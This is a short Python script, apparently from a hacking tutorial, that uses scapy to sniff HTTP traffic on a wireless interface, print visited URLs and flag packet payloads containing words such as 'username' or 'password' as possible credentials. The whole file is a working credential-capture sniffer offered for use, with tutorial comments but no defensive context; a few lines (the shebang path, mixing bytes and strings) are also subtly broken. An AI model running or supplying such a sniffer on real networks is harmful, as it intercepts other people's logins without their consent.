#!usr/bin/env python3 

import scapy.all as scapy 
from scapy.layers import http

def sniff(interface):
    scapy.sniff(iface = interface, store = False, prn = processed_sniffed_packet) 
    #prn = For each packet we capture it'll call another function for us

def get_url(packet):
        #print(packet.show()) #Shows which part of the HTTP layer has what 
        return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path

def get_login_info(packet):
        if packet.haslayer(scapy.Raw): 
            load = str(packet[scapy.Raw].load) #Converting byte to str
            keyword_list = ["username", "password", "pass", "login", "user"]
            for keyword in keyword_list: #Iterating over the list 
                if keyword in load: #Checking if the value is in the list 
                    return load 
                    #break

def processed_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest): #Checks if packet has HTTP layer
        url = get_url(packet)
        print(">> HTTP Request URL " + url.decode()) #str(url)
        
        login_info = get_login_info(packet)
        
        if login_info:
                print("\n\n Possible username or password" + login_info + "\n\n")

sniff("wlan0")